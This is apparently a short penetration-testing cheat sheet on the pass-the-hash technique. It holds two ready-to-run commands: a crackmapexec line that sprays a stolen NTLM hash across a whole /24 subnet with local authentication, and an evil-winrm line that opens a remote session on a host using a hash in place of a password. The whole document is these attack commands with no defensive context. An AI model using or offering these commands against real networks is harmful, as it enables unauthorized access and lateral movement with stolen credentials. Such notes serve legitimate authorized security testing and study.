# Pass the Hash

**Spray the hash** through the entire network. Just comparing local user's hash.

```
crackmapexec smb 192.168.0.0/24 -u <User> -H <NTLM-Hash> --local
```

Connect using **evil-winrm.**

```
evil-winrm -i 10.0.0.1 -u <user> -H <Hash>
```
